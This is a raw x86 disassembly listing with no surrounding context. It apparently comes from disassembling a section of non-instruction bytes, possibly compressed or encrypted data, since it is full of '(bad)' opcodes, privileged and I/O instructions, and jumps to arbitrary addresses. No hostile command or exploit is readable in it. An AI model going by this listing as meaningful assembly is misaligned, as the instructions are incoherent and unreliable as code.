  413e8b:	je     0x413ec2
  413e8d:	jecxz  0x413ebc
  413e8f:	add    BYTE PTR fs:[eax],al
  413e92:	imul   esp,edx,0xe28172ff
  413e98:	pusha  
  413e99:	jae    0x413ec9
  413e9b:	stc    
  413e9c:	ins    DWORD PTR es:[edi],dx
  413e9d:	imul   ecx,DWORD PTR [eax+0x4a],0xe669654c
  413ea4:	push   edx
  413ea5:	popa   
  413ea6:	mov    bh,bl
  413ea8:	pop    ebx
  413ea9:	dec    esp
  413eaa:	jne    0x413e9b
  413eac:	outs   dx,DWORD PTR ds:[esi]
  413ead:	inc    esi
  413eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413eaf:	inc    esi
  413eb0:	add    BYTE PTR [ebx+0x7f],dl
  413eb3:	pop    esp
  413eb4:	push   esp
  413eb5:	push   edi
  413eb6:	fnstcw WORD PTR [edi]
  413eb8:	inc    ecx
  413eb9:	pop    esp
  413eba:	xor    DWORD PTR [edi+0x28],ebp
  413ebd:	pop    edi
  413ebe:	mov    eax,ds:0x8c722462
  413ec3:	mov    ebx,0x1f826e4c
  413ec8:	and    al,0x6c
  413eca:	xchg   ebp,eax
  413ecb:	mov    esp,DWORD PTR [esp+esi*2]
  413ece:	mov    DWORD PTR [ebx+0x5c7d5f45],edi
  413ed4:	dec    eax
  413ed5:	arpl   WORD PTR [bp+di+0x5f51],di
  413eda:	bound  ecx,QWORD PTR [esi+0x37]
  413edd:	ins    DWORD PTR es:[edi],dx
  413ede:	arpl   WORD PTR [edi+0x4],cx
  413ee1:	dec    eax
  413ee2:	inc    esi
  413ee3:	out    dx,al
  413ee4:	aaa    
  413ee5:	dec    esi
  413ee6:	push   eax
  413ee7:	pop    eax
  413ee8:	and    eax,0x24ee5c00
  413eed:	jb     0x413f5e
  413eef:	pop    esp
  413ef0:	sub    eax,0x24ed3163
  413ef5:	imul   eax,DWORD PTR [eax],0x0
  413ef8:	push   ds
  413ef9:	jmp    DWORD PTR [esp+eax*2]
  413efc:	sbb    BYTE PTR ds:0xaa256125,cl
  413f02:	xor    esi,DWORD PTR [edi+0x31]
  413f05:	or     ebp,DWORD PTR [edi]
  413f07:	jb     0x413f0e
  413f09:	stc    
  413f0a:	xor    al,0x6b
  413f0c:	adc    ebx,DWORD PTR [eax]
  413f0e:	ss add bh,dh
  413f11:	or     eax,0xc7067254
  413f16:	xor    BYTE PTR [ecx-0x22],ah
  413f19:	(bad)  
  413f1a:	add    DWORD PTR [ecx-0x2a],edx
  413f1d:	fdiv   DWORD PTR ds:0x26ccd075
  413f23:	pop    esp
  413f24:	in     al,0xdb
  413f26:	xor    esi,DWORD PTR [eax+ebx*8-0x28]
  413f2a:	loope  0x413f7b
  413f2c:	ret    
  413f2d:	shr    DWORD PTR [edx+esi*2],cl
  413f30:	mov    eax,0x25c0166
  413f35:	adc    al,0xd9
  413f37:	inc    ebp
  413f38:	xchg   esi,eax
  413f39:	and    BYTE PTR [ebp+0x7ffaa137],ah
  413f3f:	xor    DWORD PTR [esi-0x7fb862ec],edx
  413f45:	cmp    edi,DWORD PTR [ebx+0x26]
  413f48:	cmp    dl,0x8f
  413f4b:	xor    DWORD PTR [esi-0x6dae6cec],ecx
  413f51:	and    BYTE PTR [ebx+0x4c228e35],ah
  413f57:	add    al,0x81
  413f59:	xor    ebx,DWORD PTR [edx+0x35]
  413f5c:	add    BYTE PTR [eax],al
  413f5e:	jl     0x413f99
  413f60:	pop    ecx
  413f61:	sub    BYTE PTR [ecx],dh
  413f63:	aas    
  413f64:	pop    ecx
  413f65:	xor    BYTE PTR [ecx],dh
  413f67:	aas    
  413f68:	cmp    ah,BYTE PTR [edi]
  413f6a:	inc    ebx
  413f6b:	pop    edx
  413f6c:	dec    eax
  413f6d:	das    
  413f6e:	push   edx
  413f6f:	adc    al,0x19
  413f71:	xor    DWORD PTR [eax+eiz*1+0x23],ecx
  413f75:	sub    eax,DWORD PTR [ebx+0x2f]
  413f78:	or     bh,BYTE PTR [eax]
  413f7a:	sbb    al,0x26
  413f7c:	and    BYTE PTR [ecx+eax*1],al
  413f7f:	cmp    DWORD PTR [ecx],ebx
  413f81:	cmp    BYTE PTR [ecx],dh
  413f83:	inc    ebp
  413f84:	(bad)  
  413f85:	sub    DWORD PTR ds:0x12360821,ebx
  413f8b:	dec    eax
  413f8c:	sbb    dh,BYTE PTR [ecx]
  413f8e:	add    ah,BYTE PTR [eax]
  413f90:	jmp    ebx
  413f92:	loopne 0x413fce
  413f94:	cmc    
  413f95:	es add esi,esp
  413f98:	mov    edx,0xcd3bd026
  413f9d:	xor    ch,dl
  413f9f:	cmp    dh,cl
  413fa1:	sub    dl,dl
  413fa3:	and    al,0xab
  413fa5:	pop    eax
  413fa6:	shl    BYTE PTR ds:0x21d635ab,cl
  413fac:	les    ebx,FWORD PTR [edi-0x10]
  413faf:	cmp    BYTE PTR [eax],al
  413fb1:	mov    DWORD PTR [eax],0xbb56135
  413fb7:	aaa    
  413fb8:	outs   dx,BYTE PTR ds:[esi]
  413fb9:	call   0x3368:0x9b634532
  413fc0:	jb     0x413f7f
  413fc2:	add    BYTE PTR [eax],al
  413fc4:	pop    ebx
  413fc5:	and    al,0x63
  413fc7:	jmp    0xc9918034
  413fcc:	jne    0x414027
  413fce:	dec    esi
  413fcf:	xchg   ebp,eax
  413fd0:	pop    esp
  413fd1:	pop    ecx
  413fd2:	dec    esp
  413fd3:	jmp    0xaa918040
  413fd8:	popa   
  413fd9:	push   esi
  413fda:	add    BYTE PTR [edi],dl
  413fdc:	and    eax,0x86e96622
  413fe1:	inc    esp
  413fe2:	jb     0x41402a
  413fe4:	pop    ss
  413fe5:	das    
  413fe6:	ins    BYTE PTR es:[edi],dx
  413fe7:	inc    esp
  413fe8:	and    dl,BYTE PTR [ecx+eax*4]
  413feb:	inc    esp
  413fec:	icebp  
  413fed:	sbb    DWORD PTR [esi+0x712f957a],ecx
  413ff3:	xchg   BYTE PTR [esi+0x3c],bh
  413ff6:	je     0x41402d
  413ff8:	std    
  413ff9:	jmp    0x3c74162a
  413ffe:	je     0x414015
  414000:	pop    ebp
  414001:	and    eax,0xa78fc63a
  414006:	arpl   WORD PTR ds:0xd62cea5d,dx
  41400c:	xor    bh,BYTE PTR [ecx]
  41400e:	jo     0x414014
  414010:	inc    ebx
  414011:	inc    edi
  414012:	add    dh,bh
  414014:	push   ebp
  414015:	ss fs mov edi,0xe974474e
  41401c:	cmovne ebp,DWORD PTR [ebp-0x39]
  414020:	push   ds
  414021:	and    DWORD PTR [edi-0x25],ebx
  414024:	or     DWORD PTR [eax+0x4d],ecx
  414027:	fld    DWORD PTR [eax]
  414029:	add    BYTE PTR [ecx],cl
  41402b:	and    bl,BYTE PTR [edi+0x0]
  41402e:	cmp    BYTE PTR [ebx+0x6b],al
  414031:	data16 jl 0x414012
  414034:	pop    esp
  414035:	jb     0x4140a4
  414037:	adc    ecx,DWORD PTR [ecx+eiz*2+0x7b]
  41403b:	fistp  WORD PTR [edi]
  41403d:	inc    esp
  41403e:	shl    esp,0x60
  414041:	arpl   WORD PTR [ebp+esi*8+0x12fb7971],di
  414048:	dec    esp
  414049:	popa   
  41404a:	mov    ebx,0xa6491fde
  41404f:	loope  0x4140c4
  414051:	popa   
  414052:	mov    ah,0xf6
  414054:	pop    ds
  414055:	push   eax
  414056:	test   eax,0x970067de
  41405b:	loop   0x4140bd
  41405d:	jb     0x4140d8
  41405f:	mov    dh,0x45
  414061:	push   esp
  414062:	adc    eax,0x70735c44
  414067:	std    
  414068:	imul   ebp,DWORD PTR [esp+eax*1-0x9],0x6f
  41406d:	gs data16 xor al,0x5f
  414071:	outs   dx,DWORD PTR ds:[esi]
  414072:	jne    0x414059
  414074:	pop    esp
  414075:	outs   dx,BYTE PTR ds:[esi]
  414076:	ins    BYTE PTR es:[edi],dx
  414077:	adc    BYTE PTR [ebx+0x69],dh
  41407a:	sti    
  41407b:	cld    
  41407c:	gs je  0x4140c7
  41407f:	jecxz  0x4140f2
  414081:	jbe    0x4140ce
  414083:	mov    dh,0x5f
  414085:	imul   esi,DWORD PTR [esi],0x2b415c10
  41408b:	std    
  41408c:	inc    ecx
  41408d:	dec    ecx
  41408e:	add    BYTE PTR [eax],al
  414090:	sub    al,0x10
  414092:	dec    edi
  414093:	outs   dx,DWORD PTR ds:[esi]
  414094:	cs in  al,dx
  414096:	jb     0x4140f9
  414098:	jp     0x414095
  41409a:	pop    ebx
  41409b:	inc    ecx
  41409c:	sub    edi,ebp
  41409e:	inc    ecx
  41409f:	dec    ecx
  4140a0:	lods   al,BYTE PTR ds:[esi]
  4140a1:	adc    cl,BYTE PTR [ecx+0x52]
  4140a4:	popf   
  4140a5:	adc    cl,BYTE PTR [edi+0x4f]
  4140a8:	xor    DWORD PTR [edi+0x55],esi
  4140ab:	push   ebp
  4140ac:	lock push 0x48
  4140af:	pop    esp
  4140b0:	repnz shl BYTE PTR [ecx+esi*2],0xc2
  4140b5:	iret   
  4140b6:	xor    bl,BYTE PTR [ebp+eiz*8+0x63]
  4140ba:	xor    DWORD PTR [ebx-0x1b],esp
  4140bd:	rcr    DWORD PTR [edi],cl
  4140bf:	pop    esp
  4140c0:	stos   BYTE PTR es:[edi],al
  4140c1:	jp     0x414102
  4140c3:	das    
  4140c4:	outs   dx,DWORD PTR ds:[esi]
  4140c5:	leave  
  4140c6:	inc    edx
  4140c7:	xor    BYTE PTR [edi-0x30],dh
  4140ca:	stc    
  4140cb:	das    
  4140cc:	pop    eax
  4140cd:	mov    edi,0x7c7033f0
  4140d2:	inc    edx
  4140d3:	sub    esi,DWORD PTR [ebx+0x7a]
  4140d6:	inc    ebx
  4140d7:	xor    ecx,DWORD PTR [edi+eiz*2-0xc]
  4140db:	ds aas 
  4140dd:	pop    edi
  4140de:	dec    eax
  4140df:	xor    ah,BYTE PTR [esi]
  4140e1:	cmc    
  4140e2:	repnz xor al,0x1e
  4140e5:	dec    eax
  4140e6:	add    al,0x51
  4140e8:	outs   dx,BYTE PTR ds:[esi]
  4140e9:	cmc    
  4140ea:	push   edi
  4140eb:	push   ebp
  4140ec:	jo     0x4140d7
  4140ee:	inc    esp
  4140ef:	pop    esp
  4140f0:	jb     0x414131
  4140f2:	and    DWORD PTR [ecx+0x0],esi
  4140f5:	add    BYTE PTR [edx+0x50],al
  4140f8:	das    
  4140f9:	pop    esp
  4140fa:	gs in  al,0x33
  4140fd:	arpl   WORD PTR [ebp+0x54],sp
  414100:	and    bl,BYTE PTR [edx+ebp*1-0x4c]
  414104:	inc    esi
  414105:	aas    
  414106:	pop    esp
  414107:	shl    dh,0x31
  41410a:	pop    eax
  41410b:	rol    BYTE PTR [esi+0x2f],1
  41410e:	arpl   cx,cx
  414110:	out    dx,al
  414111:	xor    eax,DWORD PTR [esi+0x68]
  414114:	hlt    
  414115:	sub    dh,bl
  414117:	stc    
  414118:	repnz ss dec esp
  41411b:	clc    
  41411c:	div    DWORD PTR [edi]
  41411e:	inc    ebx
  41411f:	pusha  
  414120:	inc    ebx
  414121:	cmp    BYTE PTR [ecx],ah
  414123:	adc    al,0x1e
  414125:	icebp  
  414126:	and    BYTE PTR [ecx-0x24],dl
  414129:	add    esp,esp
  41412b:	cmp    bl,dl
  41412d:	es iret 
  41412f:	pop    ds
  414130:	xlat   BYTE PTR ds:[ebx]
  414131:	xor    bl,al
  414133:	sbb    eax,0x35cfedba
  414138:	rol    BYTE PTR [ebx],1
  41413a:	les    edi,FWORD PTR [edx]
  41413c:	mov    edx,0xb71fcf26
  414141:	in     eax,dx
  414142:	xchg   edi,eax
  414143:	ss nop
  414145:	add    ebp,DWORD PTR [edi+0x40]
  414148:	mov    bh,0x55
  41414a:	mov    WORD PTR [ebx],gs
  41414c:	mov    BYTE PTR [edx+edx*4],ah
  41414f:	and    bh,BYTE PTR [ebp-0x18db7adb]
  414155:	inc    ebp
  414156:	pop    ebp
  414157:	inc    esp
  414158:	xchg   ebp,eax
  414159:	sub    al,0x0
  41415b:	add    BYTE PTR [esi-0x7cd971cd],al
  414161:	div    BYTE PTR [edi+0x20]
  414164:	xor    DWORD PTR [eax+0x39],ecx
  414167:	sub    al,0x4e
  414169:	ss dec esi
  41416b:	push   ecx
  41416c:	dec    esp
  41416d:	cs pop ebx
  41416f:	out    dx,al
  414170:	push   ecx
  414171:	xor    eax,0x215f043c
  414176:	cmp    dh,cl
  414178:	adc    al,0x30
  41417a:	dec    ebx
  41417b:	xor    BYTE PTR [ecx],dh
  41417d:	push   esi
  41417e:	sbb    dl,BYTE PTR [ecx+0x54]
  414181:	pop    ebx
  414182:	cmp    eax,0x3514252b
  414187:	push   ecx
  414188:	add    BYTE PTR [ebp+0x3a],al
  41418b:	sub    al,0x22
  41418d:	and    BYTE PTR [ebx],cl
  41418f:	sub    eax,0x4de7361c
  414194:	loopne 0x4141d6
  414196:	sub    DWORD PTR [ebx],esp
  414198:	add    BYTE PTR [edi],ch
  41419a:	mov    ch,0xf7
  41419c:	fisttp QWORD PTR [edi+0x0]
  41419f:	or     al,0x50
  4141a1:	aaa    
  4141a2:	fs add al,0xf3
  4141a5:	and    BYTE PTR [esi-0x31],ah
  4141a8:	mov    cr0,eax
  4141ab:	mov    edx,0xbd4752f7
  4141b0:	out    dx,eax
  4141b1:	pop    eax
  4141b2:	pop    ebp
  4141b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141b4:	add    BYTE PTR [ecx],dh
  4141b6:	arpl   WORD PTR [eax-0x1694cf02],si
  4141bc:	loop   0x414218
  4141be:	das    
  4141bf:	clc    
  4141c0:	add    BYTE PTR [eax],al
  4141c2:	aad    0x4e
  4141c4:	arpl   WORD PTR [ebp-0x738bcd85],si
  4141ca:	pusha  
  4141cb:	xor    bl,BYTE PTR [edi-0x73]
  4141ce:	imul   esi,DWORD PTR [edi],0x3146ba77
  4141d4:	je     0x4141bf
  4141d6:	bound  ecx,QWORD PTR [ebp+0x2f]
  4141d9:	mov    eax,0x7572e365
  4141de:	dec    edx
  4141df:	aaa    
  4141e0:	outs   dx,BYTE PTR ds:[esi]
  4141e1:	jge    0x41422e
  4141e3:	xor    eax,0x1417755f
  4141e8:	push   eax
  4141e9:	xor    bl,ah
  4141eb:	repnz push eax
  4141ed:	and    eax,0x4c444187
  4141f2:	push   cs
  4141f3:	es ja  0x41424f
  4141f6:	add    DWORD PTR [eax+edx*2],edx
  4141f9:	xor    bh,BYTE PTR [edx+esi*8+0x3707275c]
  414200:	arpl   WORD PTR [edx],bx
  414202:	or     DWORD PTR [ecx],esi
  414204:	je     0x4141ef
  414206:	xor    dl,BYTE PTR [eax+eax*1]
  414209:	jmp    0xe9415640
  41420e:	xor    dl,BYTE PTR [eax+eax*1]
  414211:	jmp    0xe9415648
  414216:	xor    dl,BYTE PTR [eax+eax*1]
  414219:	add    BYTE PTR [eax-0x77ffffe9],bl
  41421f:	pop    ss
  414220:	add    BYTE PTR [eax],al
  414222:	mov    BYTE PTR [edi],dl
  414224:	add    BYTE PTR [eax],al
  414226:	add    BYTE PTR [eax],al
  414228:	pop    eax
  414229:	pop    ss
  41422a:	outs   dx,DWORD PTR ds:[esi]
  41422b:	jno    0x4142a9
  41422d:	lock jae 0x414295
  414230:	cmp    ebp,DWORD PTR [esi+0x176c6c61]
  414236:	outs   dx,DWORD PTR ds:[esi]
  414237:	jno    0x4141c5
  414239:	lock jae 0x4142a1
  41423c:	dec    ebx
  41423d:	imul   esi,DWORD PTR ds:[eax+0x75],0xffffffed
  414242:	push   DWORD PTR [edx+0x79]
  414245:	sti    
  414246:	fs je  0x41423e
  414249:	test   eax,0xedbc635c
  41424e:	outs   dx,BYTE PTR ds:[esi]
  41424f:	gs or  dl,ch
  414252:	ins    BYTE PTR es:[edi],dx
  414253:	ins    BYTE PTR es:[edi],dx
  414254:	mov    cl,0xf2
  414256:	pusha  
  414257:	xor    ebx,edi
  414259:	out    0x71,al
  41425b:	gs mov al,bh
  41425e:	jno    0x4142c5
  414260:	or     dl,ch
  414262:	ins    BYTE PTR es:[edi],dx
  414263:	ins    BYTE PTR es:[edi],dx
  414264:	mov    cl,0xf2
  414266:	pusha  
  414267:	xor    edi,DWORD PTR [edi-0x779a8c17]
  41426d:	sbb    BYTE PTR [edi+0x71],ch
  414270:	ins    BYTE PTR es:[edi],dx
  414271:	icebp  
  414272:	jae    0x4142d9
  414274:	cmp    edi,DWORD PTR [edi]
  414276:	pop    edi
  414277:	outs   dx,DWORD PTR ds:[esi]
  414278:	or     al,0xe5
  41427a:	push   0x74fa0f6e
  41427f:	je     0x4142f6
  414281:	jmp    0x414282
  414283:	jb     0x41427e
  414285:	jmp    0x4142eb
  414287:	je     0x41427e
  414289:	stos   BYTE PTR es:[edi],al
  41428a:	pop    esp
  41428b:	arpl   WORD PTR [eax],ax
  41428d:	add    BYTE PTR [edi],bh
  41428f:	in     al,dx
  414290:	jo     0x4142ff
  414292:	cs aas 
  414294:	bound  ebp,QWORD PTR [ecx+esi*1+0x1a]
  414298:	add    BYTE PTR es:[ecx],dh
  41429b:	mov    al,ds:0x9c027a2a
  4142a0:	and    eax,0xf5180567
  4142a5:	sub    eax,0x28190d
  4142aa:	loop   0x414247
  4142ac:	and    eax,0xf6cfdd67
  4142b1:	pop    esp
  4142b2:	into   
  4142b3:	mov    esp,0xbe316e20
  4142b8:	xor    al,0x6c
  4142ba:	fmul   st,st(0)
  4142bc:	and    BYTE PTR [ecx],dh
  4142be:	out    0xcd,al
  4142c0:	and    eax,0x1d7c26d
  4142c5:	jno    0x414287
  4142c7:	fsubr  DWORD PTR [esp+esi*2]
  4142ca:	xchg   esp,eax
  4142cb:	sahf   
  4142cc:	pop    edx
  4142cd:	jo     0x414272
  4142cf:	nop
  4142d0:	xor    DWORD PTR [edi-0x5d],ebx
  4142d3:	cwde   
  4142d4:	add    DWORD PTR [ecx-0x60],esi
  4142d7:	xchg   edi,eax
  4142d8:	sub    al,0x74
  4142da:	xchg   esp,eax
  4142db:	mov    esi,0x907d715a
  4142e0:	xor    DWORD PTR [eax],eax
  4142e2:	sbb    BYTE PTR [eiz*1-0x96f8299],0x5c
  4142ea:	push   edx
  4142eb:	and    ah,BYTE PTR ds:0x57495473
  4142f1:	bound  eax,QWORD PTR [eax]
  4142f3:	add    BYTE PTR [eax+0x47],bl
  4142f6:	sbb    eax,0x313e3171
  4142fb:	ins    BYTE PTR es:[edi],dx
  4142fc:	pop    eax
  4142fd:	inc    edi
  4142fe:	sbb    eax,0x274e6631
  414303:	ins    BYTE PTR es:[edi],dx
  414304:	inc    esp
  414305:	push   eax
  414306:	sub    bl,BYTE PTR [ebp+0x53]
  414309:	push   edi
  41430a:	daa    
  41430b:	bound  esi,QWORD PTR [ecx]
  41430d:	stos   DWORD PTR es:[edi],eax
  41430e:	add    DWORD PTR [eax],eax
  414310:	xor    DWORD PTR [edi+eiz*8],edx
  414313:	add    esi,DWORD PTR [ecx]
  414315:	adc    al,0xe7
  414317:	add    esi,DWORD PTR [ecx]
  414319:	adc    al,0xe7
  41431b:	add    esi,DWORD PTR [ecx]
  41431d:	adc    al,0xe7
  41431f:	add    esi,DWORD PTR [ecx]
  414321:	adc    al,0xe7
  414323:	add    esi,DWORD PTR [ecx]
  414325:	adc    al,0xe7
  414327:	add    esi,DWORD PTR [ecx]
  414329:	adc    al,0xe7
  41432b:	add    esi,DWORD PTR [ecx]
  41432d:	adc    al,0xe7
  41432f:	xor    esp,ebx
  414331:	xor    ch,cl
  414333:	sub    cl,ch
  414335:	ss fucompp 
  414338:	iret   
  414339:	xor    eax,eax
  41433b:	add    esp,ecx
  41433d:	and    eax,0x2fce21be
  414342:	int3   
  414343:	add    esi,esi
  414345:	and    al,0x99
  414347:	push   ds
  414348:	lds    esi,FWORD PTR [edx]
  41434a:	mov    ebx,0xe737a72a
  41434f:	push   ebx
  414350:	xchg   BYTE PTR [eax],ch
  414352:	pop    DWORD PTR [ebx]
  414354:	xor    DWORD PTR [ebx],0x2b93
  41435a:	jge    0x41438d
  41435c:	lods   al,BYTE PTR ds:[esi]
  41435d:	cmp    edx,DWORD PTR [edx-0x73d565ec]
  414363:	xor    dl,BYTE PTR [esi+0x79f28029]
  414369:	xor    al,BYTE PTR [ebp+0x311e7b2b]
  41436f:	and    eax,0x31572080
  414374:	push   ebp
  414375:	xor    eax,0x305f280f
  41437a:	xor    DWORD PTR ds:0x315f2140,esp
  414380:	cmp    eax,0x3af20335
  414385:	cmp    al,0x45
  414387:	adc    al,0x3a
  414389:	sub    ecx,DWORD PTR [edx+esi*1+0x0]
  41438d:	inc    esi
  41438e:	pop    ebx
  41438f:	and    esi,DWORD PTR [ecx]
  414391:	call   DWORD PTR [esi+0x1c]
  414394:	je     0x41437f
  414396:	xchg   ebp,eax
  414397:	loop   0x4143f9
  414399:	jmp    0xe9a5262b
  41439e:	xchg   ebp,eax
  41439f:	loop   0x414403
  4143a1:	jmp    0x2c8d9883
  4143a6:	hlt    
  4143a7:	inc    edi
  4143a8:	and    BYTE PTR [ecx],dl
  4143aa:	dec    eax
  4143ab:	and    esi,DWORD PTR [edi+eax*1+0x12]
  4143af:	sub    eax,0x3552bd63
  4143b4:	outs   dx,BYTE PTR ds:[esi]
  4143b5:	retf   0x2924
  4143b8:	jo     0x41438f
  4143ba:	aaa    
  4143bb:	cmp    BYTE PTR [ebx-0x26],dl
  4143be:	add    BYTE PTR [eax],al
  4143c0:	das    
  4143c1:	outs   dx,BYTE PTR es:[esi]
  4143c3:	enter  0x350f,0x2c
  4143c7:	or     DWORD PTR [esi],ebx
  4143c9:	xor    ah,BYTE PTR [ecx-0x45]
  4143cc:	sti    
  4143cd:	and    esi,DWORD PTR [esp+ecx*8+0x4e]
  4143d1:	inc    esp
  4143d2:	pop    edi
  4143d3:	mov    edx,0x9b6d295d
  4143d8:	ds hlt 
  4143da:	inc    ebp
  4143db:	mov    ebx,0x84204b69
  4143e0:	pop    ecx
  4143e1:	sbb    bl,BYTE PTR [ebp+0x7d]
  4143e4:	pop    ecx
  4143e5:	cmp    DWORD PTR [edi-0x69],esp
  4143e8:	inc    ebp
  4143e9:	adc    al,0x46
  4143eb:	nop
  4143ec:	cmp    al,0x33
  4143ee:	data16 xchg BYTE PTR [edx],ch
  4143f1:	adc    al,0x5c
  4143f3:	pushf  
  4143f4:	sbb    DWORD PTR [edx],ebx
  4143f6:	addr16 push ebp
  4143f8:	or     DWORD PTR [edi],edi
  4143fa:	pop    esp
  4143fb:	daa    
  4143fc:	add    al,0x22
  4143fe:	arpl   WORD PTR [edi+0x16],cx
  414401:	sbb    al,0x5c
  414403:	jmp    0xa7756b
  414408:	cld    
  414409:	out    dx,al
  41440a:	pop    esp
  41440b:	jb     0x41447a
  41440d:	cmp    al,0x49
  41440f:	outs   dx,DWORD PTR ds:[esi]
  414410:	(bad)  
  414412:	imul   ebp,DWORD PTR [ecx+edi*8+0x17],0x29
  414417:	sub    eax,0x74661385
  41441c:	cmp    BYTE PTR [edx-0x1467d0d4],bl
  414422:	jae    0x414498
  414424:	add    BYTE PTR [eax],al
  414426:	sub    BYTE PTR [edx-0x1477d0d4],bl
  41442c:	jae    0x4144a2
  41442e:	js     0x414412
  414430:	cmp    DWORD PTR [edi],ebp
  414432:	ja     0x414447
  414434:	data16 je 0x41449f
  414437:	mov    ecx,0xe58165fd
  41443c:	pusha  
  41443d:	inc    esi
  41443e:	pushf  
  41443f:	inc    ebx
  414440:	outs   dx,DWORD PTR ds:[esi]
  414441:	imul   ebp,DWORD PTR [esp+esi*8+0x6e],0x73f86c2e
  414449:	add    BYTE PTR [ebx+0x674d5cf4],bl
  41444f:	stc    
  414450:	data16 gs loope 0x414466
  414454:	pop    esp
  414455:	dec    ebp
  414456:	out    0xdc,eax
  414458:	fs ins BYTE PTR es:[edi],dx
  41445a:	(bad)  
  41445b:	neg    DWORD PTR [ebx+0x53]
  41445e:	lods   eax,DWORD PTR ds:[esi]
  41445f:	test   DWORD PTR [eax+0x6f],0x7960e9b6
  414466:	aam    0x12
  414468:	inc    esi
  414469:	ins    BYTE PTR es:[edi],dx
  41446a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41446b:	icebp  
  41446c:	data16 add BYTE PTR [eax+eiz*8-0x16449095],dl
  414474:	pop    ebx
  414475:	inc    edx
  414476:	push   0xfffffff6
  414478:	jb     0x4144ed
  41447a:	ins    DWORD PTR es:[edi],dx
  41447b:	loop   0x4144d8
  41447d:	add    BYTE PTR ds:0x316979f7,al
  414483:	pop    ecx
  414484:	sub    BYTE PTR [edi+0x31],bl
  414487:	icebp  
  414488:	inc    esi
  414489:	ins    DWORD PTR es:[edi],dx
  41448a:	add    BYTE PTR [eax],al
  41448c:	cmp    eax,DWORD PTR [eax+ebp*1+0x6c]
  414490:	push   eax
  414491:	add    DWORD PTR [edx+esi*2+0x1e],edx
  414495:	dec    edi
  414496:	sub    ebp,DWORD PTR [esp+ecx*1-0x26]
  41449a:	push   edi
  41449b:	add    BYTE PTR [edx],al
  41449d:	push   es
  41449e:	push   ds
  41449f:	je     0x4144bf
  4144a1:	or     al,0x32
  4144a3:	arpl   bp,bp
  4144a5:	clc    
  4144a6:	push   ds
  4144a7:	arpl   WORD PTR [edx],dx
  4144a9:	adc    eax,0xace1543e
  4144ae:	inc    esp
  4144af:	jo     0x4144b2
  4144b1:	stc    
  4144b2:	sub    dh,BYTE PTR [edx+0x31]
  4144b5:	stc    
  4144b6:	and    al,0x61
  4144b8:	shl    BYTE PTR [eax-0x531c98c3],1
  4144be:	pop    ds
  4144bf:	ins    DWORD PTR es:[edi],dx
  4144c0:	mov    cl,0x28
  4144c3:	pop    edi
  4144c4:	ret    
  4144c5:	shl    ebx,1
  4144c7:	arpl   ax,dx
  4144c9:	enter  0x5101,0xc8
  4144cd:	pusha  
  4144ce:	and    BYTE PTR [edi-0x39],al
  4144d1:	(bad)  
  4144d2:	es sub BYTE PTR cs:[ebp+0x51],0x0
  4144d8:	jbe    0x4144b1
  4144da:	sub    al,0x6e
  4144dc:	xor    DWORD PTR [ebp+0x24],ebp
  4144df:	jbe    0x414467
  4144e1:	jns    0x41450f
  4144e3:	je     0x414479
  4144e5:	jp     0x4144ca
  4144e7:	arpl   WORD PTR [eax-0x77aafe79],dx
  4144ed:	test   DWORD PTR [ebx],edi
  4144ef:	push   esp
  4144f0:	add    BYTE PTR [eax],al
  4144f2:	popa   
  4144f3:	stos   DWORD PTR es:[edi],eax
  4144f4:	xor    ah,BYTE PTR [edi+0x65]
  4144f7:	nop
  4144f8:	xor    ch,BYTE PTR [esi]
  4144fa:	dec    ebp
  4144fb:	mov    DWORD PTR [ecx],eax
  4144fd:	inc    ecx
  4144fe:	ins    DWORD PTR es:[edi],dx
  4144ff:	adc    al,0x3a
  414501:	dec    ebx
  414502:	ins    DWORD PTR es:[edi],dx
  414503:	inc    eax
  414504:	(bad)
  414509:	inc    eax
  41450a:	cld    
  41450b:	out    0x17,eax
  41450d:	out    0xff,eax
  41450f:	(bad)  
  414511:	inc    ecx
  414512:	or     ah,bl
  414514:	neg    DWORD PTR [edi]
  414516:	arpl   di,bp
  414518:	out    dx,al
  414519:	inc    edx
  41451a:	imul   esp,esp,0xdc4ef3fb
  414520:	(bad)  
  414521:	inc    edx
  414522:	in     eax,dx
  414523:	push   ecx
  414524:	(bad)  
  414526:	hlt    
  414527:	push   ebp
  414528:	(bad)  [esi]
  41452a:	in     eax,0x4a
  41452c:	std    
  41452d:	push   ebx
  41452e:	add    ebp,DWORD PTR ds:0x2212510a
  414534:	cmc    
  414535:	push   ds
  414536:	jecxz  0x414518
  414538:	mov    eax,0xf936e003
  41453d:	sub    eax,0xe5da21d2
  414542:	fisubr WORD PTR [esi]
  414544:	retf   
  414545:	add    ebp,ebp
  414547:	push   ebp
  414548:	mov    ebx,0xd336ec53
  41454d:	das    
  41454e:	shl    BYTE PTR [ecx],cl
  414550:	out    0x3e,eax
  414552:	loopne 0x41459b
  414554:	ret    
  414555:	and    DWORD PTR [eax],eax
  414557:	add    BYTE PTR [ebx-0x12],ah
  41455a:	retf   0x9d22
  41455d:	adc    al,0x98
  41455f:	aas    
  414560:	jle    0x41458a
  414562:	mov    ch,ah
  414564:	xchg   edx,eax
  414565:	xor    edx,DWORD PTR [ebx-0x65a892fd]
  41456b:	das    
  41456c:	sub    BYTE PTR ds:0x535d2f85,0xb3
  414573:	cmp    eax,0x4ae7445d
  414578:	pop    edi
  414579:	sub    BYTE PTR [eax],al
  41457b:	mov    WORD PTR [eax],fs
  41457d:	arpl   WORD PTR cs:[ebp-0x2e],si
  414581:	push   ecx
  414582:	js     0x4145dd
  414584:	or     DWORD PTR [edi],ebp
  414586:	jb     0x4145cc
  414588:	add    edx,DWORD PTR [edx*2+0x6e350f40]
  41458f:	inc    esp
  414590:	add    DWORD PTR [ebx+0x5f],edx
  414593:	dec    edx
  414594:	add    eax,0x4e3b4131
  414599:	cmp    BYTE PTR [ebx+0x47],ah
  41459c:	popa   
  41459d:	xor    eax,0x14603d5f
  4145a2:	dec    ebx
  4145a3:	cmp    cl,BYTE PTR [ebp+0x4cc94355]
  4145a9:	dec    eax
  4145aa:	push   eax
  4145ab:	leave  
  4145ac:	loop   0x4145ea
  4145ae:	jno    0x4145ca
  4145b0:	dec    esp
  4145b1:	das    
  4145b2:	jb     0x4145c1
  4145b4:	inc    eax
  4145b5:	adc    al,0x44
  4145b7:	sbb    edx,esi
  4145b9:	inc    ebx
  4145ba:	inc    edi
  4145bb:	mov    bl,0x0
  4145bd:	add    BYTE PTR [edx-0x64],dl
  4145c0:	ins    DWORD PTR es:[edi],dx
  4145c1:	cli    
  4145c2:	push   cs
  4145c3:	das    
  4145c4:	jb     0x414592
